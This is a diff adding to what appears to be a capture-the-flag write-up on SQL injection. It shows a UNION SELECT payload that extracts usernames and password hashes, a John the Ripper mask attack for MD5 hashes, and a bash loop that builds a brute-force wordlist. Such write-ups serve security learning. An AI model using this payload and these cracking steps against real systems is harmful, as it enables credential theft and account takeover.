@@ -16,4 +16,20 @@ CREATE TABLE users (
 	hint text not null,
 	bio text not null)
   ```
-  
+  From this just normal payload:
+  %22 UNION SELECT username,password_hash FROM users -- -
+  So what I encounter is a bunch of md5 hash with rules
+  <img src="https://github.com/phulelouch/WRITE_UP/blob/master/SQL_Injection/login_page.png">
+  <img src="https://github.com/phulelouch/WRITE_UP/blob/master/SQL_Injection/login_page2.png">
+ With that it mean we have to crack it with its rule
+ - The easiest was the noob password, just google it and login 
+ - Then come to the phone number, using john the ripper with mask for rule:
+ 	john --format=raw-md5 flag2.txt --mask=?d?d?d-?d?d?d-?d?d?d?d --fork=12
+ - Next it would be Greek God + My least favorite US, so what I did was listing out some of the most popular Greek Gods and concat it with script, and just bruteforce it (faster)
+ ```
+ while read line; do
+	while read liness; do
+		echo $line$liness | tr -d ' ' 
+	done < "/home/phulelouch/Desktop/US.txt"
+done < "/home/phulelouch/Desktop/god.txt"
+ ```
